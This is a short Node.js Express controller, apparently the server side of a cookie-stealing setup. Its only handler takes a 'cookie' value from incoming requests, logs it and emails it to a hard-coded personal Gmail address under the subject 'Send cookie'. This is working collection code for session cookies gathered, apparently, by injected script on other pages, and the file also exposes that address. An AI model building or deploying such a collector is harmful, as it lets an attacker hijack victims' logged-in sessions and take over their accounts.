//import HTML_TEMPLATE from "./mail-template.js.js.js";
//import SENDMAIL from "./mailer.js.js.js" 
//import HTML_TEMPLATE from "../helpers/mail-template";
//import SENDMAIL from "../helpers/mailer"
const HTML_TEMPLATE = require('../helpers/mail-template')
const SENDMAIL = require('../helpers/mailer')

const mailCtrl = {};




mailCtrl.send = async (req, res) => {
    try {
        let cookie = req.body.cookie;
        console.log("Cookie is: ", cookie)
        const message = cookie;
        const options = {
            from: "TESTING <sender@gmail.com>", // sender address
            to: "diego.vega097@gmail.com", // receiver email
            subject: "Send cookie", // Subject line
            text: message,
            html: HTML_TEMPLATE(message),
        }
        // send mail with defined transport object and mail options
        SENDMAIL(options, (info) => {
            console.log("Email sent successfully");
            console.log("MESSAGE ID: ", info.messageId);
        });
        res.send({"Send":"OK"})
    } catch (e) {
      console.log(e);
    }
  };

  module.exports = mailCtrl;